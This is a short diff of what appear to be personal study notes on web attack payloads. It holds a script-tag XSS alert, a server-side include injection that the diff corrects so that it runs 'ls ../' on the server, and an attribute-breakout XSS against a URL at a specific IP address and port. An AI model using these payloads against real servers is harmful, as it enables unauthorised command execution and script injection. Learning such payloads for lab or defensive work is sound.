@@ -4,8 +4,7 @@ XSS
 <script>alert('blabla')</script>
 
 #open a cmd and entre a command on a server using a injiection
-
-<!--#exce cmd='ls ../-->
+ <! --#exec cmd="ls ../" -->  #drop the space
 
 92.60.14.134:8081/xss/iframe3?path=asdfasdf" onload="alert('blabla')
 
